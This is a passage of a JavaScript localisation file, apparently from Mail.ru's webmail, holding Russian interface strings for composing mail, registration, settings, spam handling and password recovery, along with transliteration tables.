		'verify_phone_error': 'Не удалось проверить номер',
		'phone_status_error': 'Доставка SMS для данного оператора временно отключена',
		'phone_status_latency': 'Возможна задержка при доставке SMS',
		'captcha_invalid': 'Введён неверный код'
	}});

	Lang.add({'RU': {
		'compose.field_to_empty': 'Не указан адрес получателя',
		'compose.app_title': 'Приложения',
		'compose.before_unload_confirm_text': 'Текст письма будет потерян.',
		'compose.before_unloadfix_confirm_text': 'Вы не отправили письмо и не сохранили его как черновик.\nДля того, чтобы вернуться и сохранить изменения, нажмите «Отмена», в противном случае набранный вами текст будет потерян.',
		'compose.switch_template_confirm_text': 'При смене шаблона все изменения, внесенные в письмо, будут утеряны. Вы уверены, что хотите использовать другой шаблон?',
		'compose.appearance_without_style': 'Без стиля',
		'compose.cards_without': 'Без открытки',
		'compose.save_mail_error': 'Не удалось сохранить письмо',
		'compose.save_template_error': 'Не удалось сохранить шаблон',
		'compose.save_mail_progress': 'Идет сохранение',
		'compose.save_template_progress': 'Идет сохранение шаблона',
		'compose.save_mail_success': "Сохранено в <a rel=\"history\" href=\"/messages/drafts\" class=\"toolbar__message_info__link\">черновиках</a> в <span class=\"time\"></span>",
		'compose.save_template_success': "Сохранено в <a rel=\"history\" href=\"/messages/folder/500006/\" class=\"toolbar__message_info__link\">шаблонах</a> в <span class=\"time\"></span>",
		'compose.send_mail_error': 'Не удалось отправить письмо',
		'compose.send_mail_progress': 'Идет отправка',
		'compose.drag_files': 'Перетащите файлы в любое место на странице',
		'compose.field.From': 'От кого',
		'compose.field.To': 'Кому',
		'compose.field.CC': 'Копия',
		'compose.field.BCC': 'Скрытая',
		'compose.field.Subject': 'Тема',
		'compose.field.Notify': 'Напомнить, если получатель не ответит через',
		'compose.field.NotifyPeriod': '1 день',
		'compose.field.NeedRcpt': 'С уведомлением',
		'compose.field.invalid_address': 'В поле «%s» указан некорректный адрес получателя.\nИсправьте ошибку и отправьте письмо еще раз.',

		'compose.avatar':
		{
			add: 'добавить фото',
			change: 'сменить фото'
		},

		'compose.submit_empty_message_confirm': {
			'title': 'Вы уверены?',
			'text': 'Вы уверены, что хотите отправить пустое письмо?',
			'ok': 'Продолжить'
		},

		'compose.delete_attach_confirm': {
			'title': 'Вы уверены?',
			'text': 'Вы уверены, что хотите удалить файл?',
			'ok': 'Продолжить'
		},
		// GOST 16876-71 @todo
		'translit': {"\u0430":"a","\u0431":"b","\u0432":"v","\u0433":"g","\u0434":"d","\u0435":["je","ye","e"],"\u0451":["jo","yo"],"\u0436":"zh","\u0437":["s","z"],"\u0438":"i","\u0439":"jj","\u043A":"k","\u043B":"l","\u043C":"m","\u043D":"n","\u043E":"o","\u043F":"p","\u0440":"r","\u0441":"s","\u0442":"t","\u0443":"u","\u0444":["ph","f"],"\u0445":"kh","\u0446":["c","ts"],"\u0447":"ch","\u0448":["sch","sh"],"\u0449":["shch","shh"],"\u044A":"\"","\u044B":"y","\u044C":"'","\u044D":"eh","\u044E":["ju","yu"],"\u044F":["ja","ya"]},
		'translit_smart': {
			ru: {"\u0439\u0435":"ye","\u0439\u043E":"yo","\u0439\u0443":"yu","\u0439\u044F":"ya","\u043A\u0441":"x","\u0430":"a","\u0431":"b","\u0432":"v","\u0433":"g","\u0434":"d","\u0435":["je","ye","e"],"\u0451":["jo","yo"],"\u0436":"zh","\u0437":["s","z"],"\u0438":"i","\u0439":["jj","g","i","j","y"],"\u043A":["c","k"],"\u043B":"l","\u043C":"m","\u043D":"n","\u043E":"o","\u043F":"p","\u0440":"r","\u0441":"s","\u0442":"t","\u0443":"u","\u0444":["ph","f"],"\u0445":["kh","h"],"\u0446":["c","ts"],"\u0447":"ch","\u0448":["sch","sh"],"\u0449":["shch","sch","shh"],"\u044A":"\"","\u044B":["i","y"],"\u044C":"'","\u044D":"eh","\u044E":["u","ju","yu"],"\u044F":["ja","ya","y"]},
			en: {"shch":"\u0449","sch":["\u0448","\u0449"],"shh":"\u0449","ch":"\u0447","ja":["\u0439\u044F","\u044F"],"je":"\u0435","jo":"\u0451","ju":"\u044E","sh":"\u0448","ts":"\u0446","ya":["\u0439\u044F","\u044F"],"ye":"\u0435","yo":"\u0451","yu":"\u044E","a":"\u0430","b":"\u0431","c":"\u043A","v":"\u0432","g":["\u0433","\u0439"],"d":"\u0434","e":"\u0435","f":"\u0444","i":["\u0438","\u0439","\u044B"],"j":"\u0439","k":"\u043A","l":"\u043B","m":"\u043C","n":"\u043D","o":"\u043E","p":"\u043F","r":"\u0440","s":["\u0437","\u0441"],"t":"\u0442","u":["\u0443","\u044E"],"x":"\u043A\u0441","y":["\u0438\u0439","\u0439","\u044B","\u044F"],"z":"\u0437"}
		}
	}});

	Lang.add({'RU': {
		'reg.field_empty': 'Заполните обязательное поле',
		'reg.login_exists': 'Ящик с таким именем уже существует',
		'reg.login_start_symbol_invalid': 'Некорректное имя почтового ящика.\nИмя должно начинаться с латинской буквы (a-z) или цифры (0-9).',
		'reg.login_end_symbol_invalid': 'Некорректное имя почтового ящика.\nИмя должно заканчиваться на латинскую букву (a-z) или цифру (0-9).',
		'reg.login_cyrillic': 'В имени почтового ящика нельзя использовать кириллицу',
		'reg.login_format_without_point': 'Некорректное имя почтового ящика. Допустимо использовать только латинские\nбуквы, цифры, знак подчеркивания (&quot;_&quot;), минус (&quot;-&quot;).',
		'reg.password_short': 'Слишком короткий пароль',
		'reg.password_only_num': 'Извините, пароль не может состоять\nтолько из цифр. Добавьте буквы.',
		'reg.password_cyrillic': 'В пароле нельзя использовать кириллицу',
		'reg.password_unequal': 'Пароли не совпадают. Пожалуйста, проверьте.',
		'reg.password_is_bad': 'Вы ввели пароль, который легко подобрать. В целях безопасности Вам нужно задать более сложный пароль.',
		'reg.password_equal_login': 'Пароль не может совпадать с логином',
		'reg.birthday_year_empty': 'Укажите дату рождения полностью',
		'reg.birthday_invalid': 'Неверная дата',
		'reg.city_invalid': 'Выберите город из списка',
		'reg.city_sumbol_invalid': 'Напишите название города на русском',
		'reg.captcha_invalid': 'Введён неверный код',
		'reg.phone_sumbol_invalid': 'Присутствуют недопустимые символы',
		'reg.phone_code_invalid': 'Некорректный телефон',
		'reg.phone_code_incorrect': 'Некорректный телефон',
		'reg.phone_incorrect_phone_number': 'Некорректный телефон',
		'reg.phone_unsupported_number': 'Данный телефон не поддерживается',
		'reg.phone_not_enough_data': 'Данный телефон не поддерживается',
		'reg.phone_fixed-line': 'Домашние телефоны не поддерживаются',
		'reg.phone_code_short': 'Слишком короткий номер',
		'reg.phone_code_suggest': 'Возможно, вы имели в виду',
		'reg.email_sumbol_invalid': 'Некорректные символы в дополнительном e-mail',
		'reg.submit.next': 'Далее',
		'reg.rus_match': '\u0430-\u044F\u0410-\u042F'
	}});

	Lang.add({'RU': {
		'signup.error.server': 'Ошибка сервера. Пожалуйста, повторите попытку',
		'signup.error.internal': 'Произошла внутренняя ошибка. Пожалуйста, повторите попытку',
		'signup.error.auth': 'Ошибка авторизации. Пожалуйста, повторите попытку',
		'signup.error.firstname': 'Некорректно заполнено поле «Имя»',
		'signup.error.lastname': 'Некорректно заполнено поле «Фамилия»',
		'signup.error.captcha': 'Некорректно заполнено поле «Код»',
		'signup.error.limit': 'Слишком много попыток. Пожалуйста, попробуйте позже',
		'signup.error.invalid.length': 'Недопустимое количество символов',
		'signup.error.invalid.value': 'Используются недопустимые символы'
	}});

	Lang.add({'RU': {
		'signup.external': {
			'state': 'Идет обработка данных',
			'login': 'Логин',
			'password': 'Пароль',
			'server': 'Сервер',
			'port': 'Порт',
			'ready': 'Готово',
			'incoming': 'Сервер входящей почты',
			'outgoing': 'Сервер исходящей почты',
			'user.policy': 'Нажимая кнопку «Продолжить», Вы принимаете условия <a href=//help.mail.ru/mail-help/ class=\"login-form__link js-policy\" target=_blank>Лицензионного соглашения</a>.',
			'user.reload': 'Обновить код',
			'user.code': 'Код',
			'user.proceed': 'Продолжить',
			'user.name.first': 'Имя',
			'user.name.last': 'Фамилия',
			'user.title': 'Представьтесь, пожалуйста',
			'user.desc': 'Укажите данные для ящика %email%, чтобы получатели ваших писем знали, от кого пришло письмо.',
			'settings.error.user': 'Неверное имя пользователя или пароль. Проверьте правильность введенных данных',
			'settings.error.user.email': 'Некорректно заполнено поле «Логин»',
			'settings.error.user.password': 'Некорректно заполнено поле «Пароль»',
			'settings.error.collect': 'Неверно указаны настройки сервера входящей почты',
			'settings.error.collect.server': 'Неверно указан сервер входящей почты',
			'settings.error.collect.port': 'Неверно указан порт входящей почты',
			'settings.error.smtp': 'Неверно указаны настройки сервера исходящей почты',
			'settings.error.smtp.server': 'Неверно указан сервер исходящей почты',
			'settings.error.smtp.port': 'Неверно указан порт исходящей почты',
			'settings.error.internal': 'Ошибка сервера. Пожалуйста, повторите попытку',
			'settings.error.token': 'Ошибка авторизации. Пожалуйста, повторите попытку',
			'settings.error.smtp_auth_fail': 'Не удается подключиться к серверу исходящей почты',
			'settings.error.collect_timeout': 'Превышено время ожидания с сервером входящей почты. Пожалуйста, повторите попытку',
			'settings.error.invalid': 'Неверное имя пользователя или пароль. Проверьте правильность введенных данных',
			'settings.error.collect_auth_fail': 'Неверное имя пользователя или пароль. Проверьте правильность введенных данных',
			'settings.error.exists_domain': 'Для указанного сервера уже установлены настройки',
			'settings.error.auth_limit': 'Слишком много попыток. Пожалуйста, попробуйте позже',
			'settings.title': 'Введите данные для входа в почтовый ящик',
			'settings.desc': 'Вы можете добавить любой почтовый ящик, поддерживающий сбор почты по протоколу POP/IMAP. Если логин введен неверно, <a href=\"/login?email=login@mail.ru\" target=\"_blank\">авторизуйтесь заново</a>.',
		'suggests.title': 'Уточните почту для входа',
		'suggests.desc': 'Возможно вы ошиблись при вводе адреса электронной почты. Выберите почту для входа или <a href=\"/login?email=login@mail.ru\">введите заново</a> логин и пароль.'
		}
	}});

	Lang.add({'RU': {
		'filesearch.not_found': 'Файлы не найдены',
		'filesearch.empty_dir': 'В данной папке файлов нет'
	}});

	Lang.add({'RU': {
		'search.onaddressbook': 'Поиск по адресной книге',
		'search.onmail': 'Поиск по почте',
		'search.onagent': 'Поиск по истории Агента',
		'search.onfiles': 'Поиск по файлам',
		'search.results': 'Результаты поиска'
	}});

	// TODO: Delete this block
	Lang.add({'RU': {
		'balloon.spam': 'Нажмите «Это спам», и письма от этого адресата всегда будут приходить в папку «Спам»',
		'balloon.nospam': 'Нажмите «Не спам» и письма от этого адресата всегда будут приходить в папку «Входящие»',
		'balloon.attachWord': 'Вы можете просмотреть документы Word, не загружая их на компьютер.',
		'balloon.attachExcel': 'Вы можете просмотреть документы Excel, не загружая их на компьютер.',
		'balloon.attachPowerPoint': 'Вы можете просмотреть презентации, не загружая их на компьютер.',
		'balloon.themes': '%sВыберите тему оформления%s почты на свой вкус.'
	}});

	Lang.add({'RU': {
		'checknew.clear': 'очистить',
		'checknew.clear_folder': 'очистить папку',
		'checknew.check': 'пометить флажком',
		'checknew.uncheck': 'снять флажок',
		'checknew.enter_password': 'Введите пароль',
		'checknew.enter_password_for_folder': 'Доступ к папке «%s» защищен паролем, введите его для продолжения работы',
		'checknew.forgot_password': 'забыли пароль',
		'checknew.done': 'Готово',
		'checknew.select.new': '- новая -',
		'checknew.select.new2': '- новую -',
		'checknew.protected_folder': 'Папка защищена паролем',
		'checknew.unlocked_folder': 'Папка разблокирована',
		'checknew.magent': 'Агент',
		'checknew.edit': 'редактировать',
		'checknew.remove': 'удалить',
		'checknew.no_unread': 'нет непрочитанных сообщений',
		'checknew.clear_selection': 'снять выбор',
		'checknew.no_new': 'У Вас нет новых писем',
		'checknew.not_found': 'Требуемое письмо на сервере отсутствует',
		'checknew.spam': 'Это спам',
		'checknew.not_spam': 'Это не спам',
		'checknew.text': 'Текст письма',
		'checknew.rfc': 'RFC-Заголовок',
		'checknew.click_to_magent': 'Щелкни, чтобы пообщаться с этим человеком в Mail.Ru Агенте',
		'checknew.find_from': 'найти все письма от %s'
	}});

	Lang.add({'RU': {
		'microformat.read': 'Прочитать',
		'microformat.reply': 'Ответить',
		'microformat.accept': 'Принять',
		'microformat.reject': 'Отказаться',
		'microformat.action': 'Перейти',
		'microformat.view': 'Посмотреть'
	}});

	Lang.add({'RU': {
		'msglist.check': 'пометить флажком',
		'msglist.uncheck': 'снять флажок',
		'msglist.select': 'снять выбор',
		'msglist.unselect': 'выбрать'
	}});

	Lang.add({'RU': {
		'myfriendssuggest.click_to_magent': 'Щелкни, чтобы пообщаться с этим человеком в Mail.Ru Агенте',
		'myfriendssuggest.to_friends': 'В друзья',
		'myfriendssuggest.wtf': 'Мы не знакомы',
		'myfriendssuggest.probably_friends': 'Возможно, вы знакомы',
		'myfriendssuggest.next_1': 'Следующий',
		'myfriendssuggest.next_2': 'Следующие два',
		'myfriendssuggest.next_3': 'Следующие три',
		'myfriendssuggest.wrong_captcha': 'Вы неверно ввели число, изображенное на картинке.',
		'myfriendssuggest.friendship_offer': 'Предложение&nbsp;дружбы\nотправлено',
		'myfriendssuggest.friend_added': 'Подружились',
		'myfriendssuggest.already_friendship_offer_sent': 'Вы уже предложили дружбу',
		'myfriendssuggest.already_friends': 'Вы уже друзья',
		'myfriendssuggest.ratelimited_emails': 'Предложение дружбы временно невозможно',
		'myfriendssuggest.offer_impossible': 'Предложение дружбы невозможно',
		'myfriendssuggest.data_sending_error': 'Ошибка\nотправки данных',
		'myfriendssuggest.enter_captcha': 'Введите число, изображенное на картинке.',
		'myfriendssuggest.enter_captcha_nl': 'Введите число,\nизображенное на картинке:'
	}});

	Lang.add({'RU': {
		'phonemanager.lt5min': 'менее 5 минут',
		'phonemanager.lt10min': 'менее 10 минут',
		'phonemanager.lt15min': 'менее 15 минут',
		'phonemanager.lt20min': 'менее 20 минут',
		'phonemanager.lt30min': 'менее 30 минут',
		'phonemanager.lt60min': 'менее часа',
		'phonemanager.gt60min': 'более часа'
	}});

	Lang.add({'RU': {
		'readmsg.protected_archive': 'Архив защищен паролем',
		'readmsg.broken_archive': 'Не удалось открыть архив',
		'readmsg.show_folder': 'Раскрыть папку',
		'readmsg.hide_folder': 'Скрыть папку',
		'readmsg.protected': 'защищено паролем',
		'readmsg.part': 'часть файла',
		'readmsg.download': 'Скачать',
		'readmsg.confirm.lost_text': 'Вы действительно хотите перейти на страницу написания письма? Текст, набранный в поле быстрого ответа, при этом будет потерян.\n\nЧтобы продолжить, нажмите «OK». Чтобы остаться на данной странице, нажмите «Отмена»',
		'readmsg.confirm.remove': 'Вы действительно хотите удалить сообщение без возможности воcстановления?',
		'readmsg.confirm.link_click': 'Вы собираетесь перейти на сайт: %s\nНикогда не вводите пароль от своего почтового ящика на посторонних ресурсах.\nОткрыть сайт?',
		'readmsg.confirm.send_form': 'Вы собираетесь отправить данные из этой формы на сайт: %s\nБудьте внимательны, никогда не отправляйте пароли от своего ящика на посторонние ресурсы. Чтобы продолжить, нажмите ОК.\nОткрыть сайт?',
		'readmsg.error.wrong_translation_direction': 'Некорректно выбрано направление перевода.',
		'readmsg.error.no_text': 'Вы не ввели текст письма',
		'readmsg.error.no_to': 'В поле Кому не указано ни одного адреса.',
		'readmsg.not_specified': 'Не указано',
		'readmsg.text': 'Текст письма',
		'readmsg.file_was_removed': 'Файл был удален',
		'readmsg.headers': 'Служебные заголовки',
		'readmsg.click_to_magent': 'Щелкни, чтобы пообщаться с этим человеком в Mail.Ru Агенте',
		'readmsg.find_from': 'Найти все письма от %s'
	}});

	Lang.add({'RU': {
		'appearancetemplates.grandfather': 'Дед мороз',
		'appearancetemplates.christmas_toys': 'Елочные игрушки',
		'appearancetemplates.winter': 'Зима',
		'appearancetemplates.panorama': 'Панорама',
		'appearancetemplates.balls': 'Шары',
		'appearancetemplates.snowflakes': 'Снежинки',
		'appearancetemplates.tulips': 'Тюльпаны',
		'appearancetemplates.camomiles': 'Ромашки',
		'appearancetemplates.lilies': 'Лилии',
		'appearancetemplates.frame2': 'Рамка №2',
		'appearancetemplates.strawberry': 'Клубника',
		'appearancetemplates.flowers_painting': 'Рисунок из цветов',
		'appearancetemplates.city_lights': 'Огни города',
		'appearancetemplates.hearts_rainbow': 'Радуга сердец',
		'appearancetemplates.bow': 'Бант',
		'appearancetemplates.stones': 'Камни',
		'appearancetemplates.camouflage': 'Камуфляж',
		'appearancetemplates.roses_letter': 'Письмо из роз',
		'appearancetemplates.valentines_tree': 'Валентиново дерево',
		'appearancetemplates.roses': 'Розы',
		'appearancetemplates.february23': 'С 23 февраля',
		'appearancetemplates.new_year': 'С Новым годом',
		'appearancetemplates.fir': 'Ель',
		'appearancetemplates.girl_with_house': 'Девочка с домиком',
		'appearancetemplates.turtledoves': 'Голубки',
		'appearancetemplates.romance': 'Романтика',
		'appearancetemplates.night': 'Ночь',
		'appearancetemplates.flowers': 'Цветы',
		'appearancetemplates.teddy_bears': 'Мишки',
		'appearancetemplates.zebra': 'Зебра',
		'appearancetemplates.cheese_mouse': 'Сырная мышь',
		'appearancetemplates.scheme': 'Схема',
		'appearancetemplates.butterflies': 'Бабочки',
		'appearancetemplates.trees': 'Деревья',
		'appearancetemplates.game': 'Игра',
		'appearancetemplates.emo': 'Эмо',
		'appearancetemplates.hiphop': 'Хип-хоп',
		'appearancetemplates.snow_peaks': 'Снежные вершины',
		'appearancetemplates.4_hills': '4 холма',
		'appearancetemplates.sport': 'Спорт',
		'appearancetemplates.vintage_template_4': 'Винтажный шаблон №4',
		'appearancetemplates.snail': 'Улитка',
		'appearancetemplates.summer': 'Лето',
		'appearancetemplates.stamps': 'Почтовые марки',
		'appearancetemplates.doggy': 'Собачка',
		'appearancetemplates.dalmatian': 'Далматинец',
		'appearancetemplates.greek_motif': 'Греческий мотив',
		'appearancetemplates.blots': 'Кляксы',
		'appearancetemplates.prehistoric': 'Доисторический',
		'appearancetemplates.hammer_and_sickle': 'Серп и молот',
		'appearancetemplates.pattern': 'Узор',
		'appearancetemplates.diamonds': 'Ромбы',
		'appearancetemplates.high_grass': 'Высокая трава',
		'appearancetemplates.book': 'Книга',
		'appearancetemplates.manuscript': 'Рукопись',
		'appearancetemplates.exercise_book': 'Школьная тетрадь',
		'appearancetemplates.greek_style': 'Греческий стиль',
		'appearancetemplates.labirynth': 'Лабиринт',
		'appearancetemplates.invitation1': 'Приглашение №1',
		'appearancetemplates.invitation2': 'Приглашение №2',
		'appearancetemplates.green_form': 'Зеленый бланк',
		'appearancetemplates.cat_on_tree': 'Кот на дереве',
		'appearancetemplates.watercolor': 'Акварель'
	}});

	Lang.add({'RU': {
		'appearancecategory.love': 'Я люблю тебя',
		'appearancecategory.animals': 'Животные',
		'appearancecategory.nature': 'Природа',
		'appearancecategory.flowers': 'Цветы',
		'appearancecategory.wintry': 'Зимние',
		'appearancecategory.classics': 'Классические',
		'appearancecategory.others': 'Разное'
	}});

	Lang.add({'RU': {
		'eventfolders.clear': 'Очистить',
		'eventfolders.clear_folder': 'Очистить папку',
		'eventfolders.error.cannot_clear': 'Не удалось очистить папку. Попробуйте снова',
		'eventfolders.confirm.remove_forever': 'Все письма будут удалены навсегда',
		'eventfolders.confirm.remove': 'Все письма будут перенесены в Корзину'
	}});

	Lang.add({'RU': {
		'wot.reputationlevel.r0': 'Без рейтинга',
		'wot.reputationlevel.r1': 'Очень плохо',
		'wot.reputationlevel.r2': 'Плохо',
		'wot.reputationlevel.r3': 'Неудовлетворительно',
		'wot.reputationlevel.r4': 'Хорошо',
		'wot.reputationlevel.r5': 'Превосходно'
	}});

	Lang.add({'RU': {
		'trash.confirm.delete_msg': 'Вы действительно хотите удалить сообщение без возможности воcстановления?',
		'trash.confirm.go_to_sentmsg': 'Вы действительно хотите перейти на страницу написания письма? Текст, набранный в поле быстрого ответа, при этом будет потерян.\n\nЧтобы продолжить, нажмите «ОК». Чтобы остаться на данной странице, нажмите «Отмена»',
		'trash.confirm.open_site': 'Вы собираетесь перейти на сайт: %s\nНикогда не вводите пароль от своего почтового ящика на посторонних ресурсах.\nОткрыть сайт?',
		'trash.confirm.send_form': 'Вы собираетесь отправить данные из этой формы на сайт: %s\nБудьте внимательны, никогда не отправляйте пароли от своего ящика на посторонние ресурсы. Чтобы продолжить, нажмите ОК.\nОткрыть сайт?',
		'trash.error.wrong_translation_direction': 'Некорректно выбрано направление перевода.',
		'trash.error.empty_msg': 'Вы не ввели текст письма',
		'trash.error.empty_to': 'В поле Кому не указано ни одного адреса.'
	}});

	Lang.add({'RU': {
		'app.my_gifts': 'Мои подарки',
		'app.blondinator': 'Блондинатор',
		'app.message_stat': 'Статистика письма'
	}});

	Lang.add({'RU': {
		'micoformat.read': 'Прочитать',
		'micoformat.reply': 'Ответить',
		'micoformat.accept': 'Принять',
		'micoformat.reject': 'Отказаться',
		'micoformat.action': 'Перейти',
		'micoformat.view': 'Посмотреть'
	}});

	Lang.add({'RU': {
		'themes.default.text': 'Вы хотите включить тему оформления почты<br />&laquo;%s&raquo;?'
	}});

	Lang.add({'RU': {
		'layers.change': 'Изменить',
		'layers.choise': 'Выберите'
	}});

	Lang.add({'RU': {
		'layer.increase_space.error.captcha.invalid': 'Неверно указан код',
		'layer.increase_space.error.captcha.required': 'Укажите код с картинки',
		'layer.increase_space.error.not_needed': 'Размер вашего ящика на данный момент оптимален',
		'layer.increase_space.error.too_big': 'Ваш почтовый ящик достиг максимального размера. К сожалению, увеличить размер почтового ящика невозможно',
		'layer.increase_space.error.unknown': 'Неизвестная ошибка, повторите запрос позднее'
	}});

	Lang.add({'RU': {
		'layer.clearFolderConfirm.header': 'Очистить папку',
		'layer.clearFolderConfirm.text': 'Вы действительно хотите удалить все письма из папки %s?',
		'layer.clearFolderConfirm.no': 'Нет',
		'layer.clearFolderConfirm.yes': 'Да'
	}});

	Lang.add({'RU': {
		'checkspam.senders.plural': ['известных вам отправителей', 'известного вам отправителя', 'известных вам отправителей']
	}});

	Lang.add({'RU': {
		'options.folders.error.required': 'Заполните обязательное поле',
		'options.folders.error.shortpassword': 'Слишком короткий пароль (минимальная длина — 4 символа)',
		'options.folders.error.passwordsdontmatch': 'Введённые пароли не совпадают',
		'options.folders.error.server': 'Ошибка сервера.',
		'options.folders.add': 'Добавить',
		'options.folders.edit': 'Изменить',
		'options.folders.topfolder': 'Папка на верхнем уровне'
	}});

	Lang.add({'RU': {
		  'passremind.reconfirm.error.system': 'Ошибка! Не удалось подтвердить данные.'
		, 'passremind.reconfirm.error.need_phone_verification': 'Необходимо подтвердить номер телефона вводом SMS-кода.'
		, 'passremind.reconfirm.error.need_phone_verification_alt': 'Необходимо <a href=\"#\" data-fires=\"cancel\">подтвердить</a> номер телефона вводом SMS-кода.'
		, 'passremind.reconfirm.error.need_restore_data': 'Необходимо указать номер мобильного телефона или дополнительный адрес, чтобы восстановить пароль в случае его потери.'
		, 'passremind.reconfirm.error.need_restore_data_alt': 'Необходимо <a href=\"#\" data-fires=\"cancel\">указать</a> номер мобильного телефона или дополнительный адрес, чтобы восстановить пароль в случае его потери.'
		, 'passremind.reconfirm.error.equal_email': 'Дополнительный адрес не может совпадать с текущим. Пожалуйста, укажите другой адрес.'
		, 'passremind.reconfirm.error.equal_email_alt': 'Дополнительный адрес не может совпадать с текущим. Пожалуйста, <a href=\"#\" data-fires=\"cancel\">укажите</a> другой адрес.'
		, 'passremind.reconfirm.error.invalid_email': 'Почтовый ящик %s не существует. <a href=\"#\" data-fires=\"addEmail\">Укажите</a> другой ящик'
		, 'passremind.reconfirm.error.disabled': 'Почтовый ящик %s заблокирован за неиспользование. Укажите другой ящик в поле «Дополнительный адрес»'
		, 'passremind.reconfirm.error.disabled_alt': 'Почтовый ящик %s заблокирован за неиспользование. Укажите другой ящик в поле «Дополнительный адрес»'
		, 'passremind.reconfirm.error.captcha_invalid': 'Ошибка! Вы ввели неправильный код с картинки.'
		, 'passremind.reconfirm.error.password_invalid': 'Ошибка! Вы ввели неправильный пароль.'
		, 'passremind.reconfirm.error.phone_invalid': 'Некорректный телефон'
		, 'passremind.reconfirm.error.phone_verify': 'Ошибка! Не удалось подтвердить телефон.'
		, 'passremind.reconfirm.error.phone_already_verified': 'Ошибка! Телефон уже подтвержден.'
		, 'passremind.reconfirm.error.phone_remove': 'Ошибка! Не удалось удалить телефон.'
		, 'passremind.reconfirm.error.phone_add': 'Ошибка! К сожалению, номер не был добавлен. Повторите попытку.'
		, 'passremind.reconfirm.error.phone_add_reached_accounts': 'Ошибка! Данный номер указан в максимально допустимом числе почтовых ящиков. Пожалуйста, укажите другой номер телефона.'
		, 'passremind.reconfirm.error.phone_add_reached_phones': 'Ошибка! Новый номер добавить невозможно. К ящику можно добавить не более 5 телефонов.'
		, 'passremind.reconfirm.error.phone_add_exists': 'Ошибка! Телефон уже был ранее добавлен к вашему ящику.'
		, 'passremind.reconfirm.error.phone_sms': 'Ошибка! SMS-сообщение с кодом не было отправлено. Пожалуйста, повторите попытку.'
		, 'passremind.reconfirm.error.phone_sms_many_requests': 'С момента отправки прошло менее 10 минут. В ближайшее время вы получите SMS-сообщение.'
		, 'passremind.reconfirm.error.phone_token_invalid': 'Ошибка! Вы ввели неправильный код.'
		, 'passremind.reconfirm.error.phone_exists': 'Данный номер телефона уже добавлен к ящику. Пожалуйста, укажите другой.'
		, 'passremind.reconfirm.error.email_invalid': 'Пожалуйста, введите корректный адрес.'
		, 'passremind.reconfirm.error.email_exists': 'Адрес не может совпадать с текущим адресом или ранее указанным дополнительным адресом. Пожалуйста, укажите другой адрес.'
		, 'passremind.reconfirm.error.email_disabled': 'Указанный ящик заблокирован, и его нельзя использовать как дополнительный адрес.'
		, 'passremind.reconfirm.error.additional_email_invalid': 'Адрес не может совпадать с текущим или ранее указанным дополнительным адресом. Пожалуйста, укажите другой адрес.'
	}});

	Lang.add({'RU': {
		"access-restore__support": {
			"_mods": {
				"primary": {
					"text": {
						"title": "Восстановление доступа к ящику"
					}
				},
				"secondary": {
						"text": {
						"title": "Восстановление доступа к ящику",
						"title_alt": "Восстановление доступа",
						"contact_title": "Как с вами связаться",
						"captcha_refresh": "Не вижу код"
					}
				}
			},
			"error": {
				"field": {
					"required_any": "Укажите больше данных о почтовом ящике"
				}
			}
		}
	}});

	Lang.add({'RU': {
		"password-restore__support": {
			"_mods": {
				"primary": {
					"text": {
						"title": "Восстановление пароля к ящику",
						"title_alt": "Восстановление пароля",
						"contact_title": "Как с вами связаться",
						"message": "Укажите данные так, как вы их помните",
						"title_exist_id": "К сожалению, тех данных, которые вы ранее указали в форме, недостаточно для того, чтобы восстановить доступ к ящику.",
						"message_exist_id": "Пожалуйста, заполните данную форму более подробно, нажмите «Отправить», и на открывшейся странице перечислите все пароли, которые вы когда-либо использовали в данном ящике, номера телефонов, которые привязывали к ящику, расскажите о темах писем, которые вы получали или отправляли с ящика, а также перечислите адресатов, с которыми чаще всего переписывались.",
						"captcha_refresh": "Не вижу код"
					}
				},
				"secondary": {
					"text": {
						"title": "Восстановление пароля к ящику",
						"title_alt": "Восстановление пароля",
						"message": "Для восстановления доступа к почтовому ящику, пожалуйста, укажите дополнительные данные так, как вы их помните",
						"device_title": "Я проверяю почту с мобильного устройства",
						"title_exist_id": "К сожалению, тех данных, которые вы ранее указали в форме, недостаточно для того, чтобы восстановить доступ к ящику.",
						"message_exist_id": "Пожалуйста, перечислите все пароли, которые вы когда-либо использовали в данном ящике, номера телефонов, которые привязывали к ящику, расскажите о темах писем, которые вы получали или отправляли с ящика, а также перечислите<br/>адресатов, с которыми чаще всего переписывались.",
						"services_title": "Другие сервисы Mail.ru, которые вы используете"
					}
				},
				"done": {
					"text": {
						"title": "Готово!",
						"description_time": "Заявка отправлена в службу поддержки и будет<br/>рассмотрена не позднее %s.",
						"description": "Заявка отправлена в службу поддержки и будет<br/>рассмотрена в ближайшее время."
					}
				},
				"ticket-exists": {
					"text": {
						"title": "Восстановление пароля к ящику",
						"title_alt": "Восстановление пароля",
						"ticket_exists": "Вы уже отправили запрос на восстановление доступа к почтовому ящику. Ваша заявка будет обработана в ближайшее время."
					}
				}
			},
			"field": {
				"name": {
					"error": {
						"required": "Поле обязательно для заполнения"
					}
				},
				"name.first": {
					"label": "Имя",
					"note": "Имя и фамилия, указанные при&nbsp;регистрации",
					"error": {
						"required": "Поле обязательно для заполнения"
					}
				},
				"name.last": {
					"label": "Фамилия",
					"error": {
						"required": "Поле обязательно для заполнения"
					}
				},
				"passwords[0]": {
					"label": "Пароли, которые вы использовали для входа в ящик",
					"error": {
						"not_allowed": "Пароль может состоять из латинских символов (A-Z, a-z), цифр (0-9) и специальных символов"
					}
				},
				"password": {
					"label": "Пароль при<br/>регистрации",
					"error": {
						"not_allowed": "Пароль может состоять из латинских символов (A-Z, a-z), цифр (0-9) и специальных символов"
					}
				},
				"signup_period": {
					"label": "Когда была<br/>зарегистрирована почта?"
				},
				"contact_phone": {
					"label": "Телефон",
					"note": "Если вы укажете эти данные, мы уведомим вас о ходе рассмотрения заявки и отправим ссылку на восстановление пароля",
					"error": {
						"required_any": "Укажите контактные данные"
					}
				},
				"contact_email": {
					"label": "Почтовый ящик",
					"error": {
						"required_any": "Укажите контактные данные",
						"recursion": "Имя ящика не должно совпадать с тем, от которого вы восстанавливаете пароль"
					}
				},
				"folders": {
					"label": "Названия личных папок<br/>в вашем ящике",
					"note": "Перечислите через запятую, какие папки вы создавали"
				},
				"messages": {
					"label": "Информация о последних отправленных письмах",
					"note": "Укажите адреса получателей и&nbsp;темы последних отправленных писем"
				},
				"additional_email": {
					"label": "Дополнительный е-mail, указанный при регистрации"
				},
				"secret_answer": {
					"label": "Ответ на секретный вопрос",
					"note": "Ответ на секретный вопрос, который когда-либо вы указывали в ящике"
				},
				"addresses": {
					"label": "Адреса тех, кому вы чаще всего пишете"
				},
				"social_info": {
					"label": "Социальные сети, которые зарегистрированны на данный ящик",
